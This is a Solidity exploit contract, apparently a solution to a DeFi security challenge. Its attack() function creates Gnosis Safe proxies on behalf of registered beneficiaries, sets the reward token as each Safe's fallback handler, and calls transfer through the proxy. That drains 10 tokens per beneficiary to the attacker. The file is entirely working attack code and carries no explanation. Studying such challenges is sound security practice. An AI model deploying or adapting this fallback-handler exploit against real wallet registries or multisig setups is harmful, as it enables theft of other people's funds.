// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxy.sol";
import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/utils/Address.sol";

contract Backdoor {
    using Address for address;
    address[] targets;
    address owner;
    GnosisSafeProxyFactory factory;
    IProxyCreationCallback registry;
    IERC20 token;
    address singleton;

    constructor(address[] memory _targets, IProxyCreationCallback _registry, GnosisSafeProxyFactory _factory, IERC20 _token, address _singleton) {
        targets = _targets;
        factory = _factory;
        token = _token;
        registry = _registry;
        singleton = _singleton;
        owner = msg.sender;
    }

    function attack() external {
        bytes memory initializer;
        for (uint8 i = 0; i < targets.length; i++) {
            bytes memory emptyBytes;
            address[] memory targetsParam = new address[](1);
            targetsParam[0] = targets[i];
            initializer = abi.encodeWithSelector(
                GnosisSafe.setup.selector,
                targetsParam, uint256(1), address(0), emptyBytes, address(token), address(0), uint256(0), payable(address(0)));
            //GnosisSafeProxy pProxy = new GnosisSafeProxy(singleton);
            //address(pProxy).functionCall(initializer);
            //address(singleton).functionCall(initializer);
            address proxy = address(factory.createProxyWithCallback(singleton, initializer, i, registry));
            IERC20(proxy).transfer(owner, 10 ether);
        }
    }

}